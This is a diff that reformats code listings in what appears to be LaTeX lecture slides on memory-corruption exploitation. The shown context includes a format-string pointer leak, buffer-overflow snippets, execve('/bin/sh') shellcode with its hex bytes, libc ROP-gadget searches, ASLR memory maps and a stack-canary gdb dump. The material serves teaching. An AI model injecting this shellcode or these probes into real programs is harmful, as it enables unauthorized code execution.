@@ -7,7 +7,12 @@
 \date{2016-01-15}
 
 \usepackage{multicol}
-\newminted{nasm}{fontsize=\scriptsize,frame=leftline,framesep=2mm,linenos}
+\newminted{nasm}{
+    fontsize=\scriptsize,
+    frame=leftline,
+    framesep=2mm,
+    autogobble,
+    linenos}
 
 \AtBeginSection[] {
     \begin{frame}{Outline}
@@ -155,7 +160,7 @@
             (context switch)
             \medskip
 
-            \begin{nasmcode*}{autogobble,linenos=false}
+            \begin{nasmcode*}{linenos=false}
                 int   0x80   ; old, but still works
                 call  write  ; new, sysenter via VDSO
             \end{nasmcode*}
@@ -236,22 +241,22 @@
         \end{column}
         \begin{column}{0.5\textwidth}
             \pause
-            \begin{pre*}{autogobble}
-                ~> echo foobar | ./main
+            \begin{code*}{linenos=false}
+                > echo foobar | ./main
                 You entered:
                 foobar
-            \end{pre*}
+            \end{code*}
             \bigskip\pause
-            \begin{pre*}{autogobble}
-                ~> echo AAAABBBB | ./main
+            \begin{code*}{linenos=false}
+                > echo AAAABBBB | ./main
                 correct
-            \end{pre*}
+            \end{code*}
             \bigskip\pause
-            \begin{pre*} {autogobble}
-                ~> echo '%08x' | ./main
+            \begin{code*}{linenos=false}
+                > echo '%08x' | ./main
                 You entered:
                 bfd98ed4
-            \end{pre*}
+            \end{code*}
             \medskip
             Oh look, a pointer, this may come in handy
         \end{column}
@@ -293,7 +298,7 @@
             Static Memory Corruption
         \end{column}
         \begin{column}{0.5\textwidth}
-            \begin{ccode*}{autogobble,linenos=false}
+            \begin{ccode*}{linenos=false}
                 void foo(void) {
                     static char buffer[64];
                     /* ... */
@@ -308,7 +313,7 @@
             Dynamic Memory (Heap) Corruption
         \end{column}
         \begin{column}{0.5\textwidth}
-            \begin{ccode*}{autogobble,linenos=false}
+            \begin{ccode*}{linenos=false}
                 void foo(void) {
                     char *buffer = (char *) malloc(64);
                     /* ... */
@@ -324,7 +329,7 @@
             Stack Smashing
         \end{column}
         \begin{column}{0.5\textwidth}
-            \begin{ccode*}{autogobble,linenos=false}
+            \begin{ccode*}{linenos=false}
                 void foo(void) {
                     char buffer[64];
                     /* ... */
@@ -375,10 +380,10 @@
 \begin{frame}[fragile]{Example}
     \begin{columns}
         \begin{column}{0.55\textwidth}
-            \begin{pre*}{autogobble,xleftmargin=1em}
+            \begin{code*}{linenos=false,xleftmargin=1em}
                 > cat shellcode.asm
-            \end{pre*}
-            \begin{nasmcode*}{autogobble,xleftmargin=1em}
+            \end{code*}
+            \begin{nasmcode*}{xleftmargin=1em}
                 xor     eax, eax    ;Clearing eax register
                 push    eax         ;Pushing NULL bytes
                 push    0x68732f2f  ;Pushing //sh
@@ -394,7 +399,7 @@
             \end{nasmcode*}
         \end{column}
         \begin{column}{0.45\textwidth}
-            \begin{pre*}{autogobble}
+            \begin{code*}{linenos=false}
                 > nasm -f elf shellcode.asm
                 > objdump -d -M intel shellcode.o
                 00000000 <.text>:
@@ -409,15 +414,15 @@
                   13:  89 e1                  mov    ecx,esp
                   15:  b0 0b                  mov    al,0xb
                   17:  cd 80                  int    0x80
-            \end{pre*}
+            \end{code*}
         \end{column}
     \end{columns}
     \bigskip
 
     Result:
-    \begin{pre*}{autogobble}
+    \begin{code*}{linenos=false}
         \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
-    \end{pre*}
+    \end{code*}
 
     \sidenote{- \url{https://dhavalkapil.com/blogs/Shellcode-Injection/}}
 \end{frame}
@@ -512,7 +517,7 @@
 \begin{frame}[fragile]{Gadgets}
     \begin{columns}
         \begin{column}{0.6\textwidth}
-            \begin{pre*}{autogobble}
+            \begin{code*}{linenos=false}
                 > objdump -d /lib/i386-linux-gnu/libc.so.6 | grep -B5 ret
                   ...
                 18f59:       8b 54 24 04             mov    0x4(%esp),%edx
@@ -529,7 +534,7 @@
                 192e5:       83 c4 24                add    $0x24,%esp
                 192e8:       c3                      ret
                   ...
-            \end{pre*}
+            \end{code*}
         \end{column}
         \begin{column}{0.4\textwidth}
             \begin{itemize}
@@ -565,8 +570,8 @@
 \end{frame}
 
 \begin{frame}[fragile]{\texttt{/proc/self/maps}}
-    \begin{pre*}{autogobble}
-        ~> cat /proc/self/maps
+    \begin{code*}{linenos=false}
+        > cat /proc/self/maps
         08048000-08054000 r-xp 00000000 08:01 131085     /bin/cat
         08054000-08055000 r--p 0000b000 08:01 131085     /bin/cat
         08055000-08056000 rw-p 0000c000 08:01 131085     /bin/cat
@@ -574,13 +579,13 @@
         b758d000-b7741000 r-xp 00000000 08:01 917531     /lib/i386-linux-gnu/libc-2.21.so
         b7752000-b7753000 r-xp 00000000 00:00 0          [vdso]
         bfb26000-bfb47000 rw-p 00000000 00:00 0          [stack]
-    \end{pre*}
+    \end{code*}
     \bigskip
     some lines have been omitted
 \end{frame}
 \begin{frame}[fragile]{\texttt{/proc/self/maps}}
-    \begin{pre*}{autogobble}
-        ~> cat /proc/self/maps
+    \begin{code*}{linenos=false}
+        > cat /proc/self/maps
         08048000-08054000 r-xp 00000000 08:01 131085     /bin/cat
         08054000-08055000 r--p 0000b000 08:01 131085     /bin/cat
         08055000-08056000 rw-p 0000c000 08:01 131085     /bin/cat
@@ -588,13 +593,13 @@
         b7595000-b7749000 r-xp 00000000 08:01 917531     /lib/i386-linux-gnu/libc-2.21.so
         b775a000-b775b000 r-xp 00000000 00:00 0          [vdso]
         bfbc9000-bfbea000 rw-p 00000000 00:00 0          [stack]
-    \end{pre*}
+    \end{code*}
     \bigskip
     some lines have been omitted
 \end{frame}
 \begin{frame}[fragile]{\texttt{/proc/self/maps}}
-    \begin{pre*}{autogobble}
-        ~> cat /proc/self/maps
+    \begin{code*}{linenos=false}
+        > cat /proc/self/maps
         08048000-08054000 r-xp 00000000 08:01 131085     /bin/cat
         08054000-08055000 r--p 0000b000 08:01 131085     /bin/cat
         08055000-08056000 rw-p 0000c000 08:01 131085     /bin/cat
@@ -602,7 +607,7 @@
         b75cc000-b7780000 r-xp 00000000 08:01 917531     /lib/i386-linux-gnu/libc-2.21.so
         b7791000-b7792000 r-xp 00000000 00:00 0          [vdso]
         bf8f8000-bf919000 rw-p 00000000 00:00 0          [stack]
-    \end{pre*}
+    \end{code*}
     \bigskip
     some lines have been omitted
 \end{frame}
@@ -662,16 +667,16 @@
     \begin{columns}
         \begin{column}{0.5\textwidth}
             \cfile[xleftmargin=0.8cm]{../canary/main.c}
-            \begin{pre*}{autogobble,xleftmargin=0.8cm}
+            \begin{code*}{linenos=false,xleftmargin=0.8cm}
                 > gcc --version
                 gcc (Ubuntu 5.2.1-22ubuntu2) 5.2.1 20151010
                   ...
                 > gcc -g -o main main.c
-            \end{pre*}
+            \end{code*}
         \end{column}
         \pause
         \begin{column}{0.5\textwidth}
-            \begin{pre*}{autogobble}
+            \begin{code*}{linenos=false}
                 > gdb ./main
                 AAAAAAA
                   ...
@@ -688,7 +693,7 @@
                 0xbffff568: 0xbffff578 (Saved RBP) <-- ebp
                 0xbffff56c: 0x0804852a (Saved RIP)
                 ------------------------
-            \end{pre*}
+            \end{code*}
         \end{column}
     \end{columns}
 \end{frame}
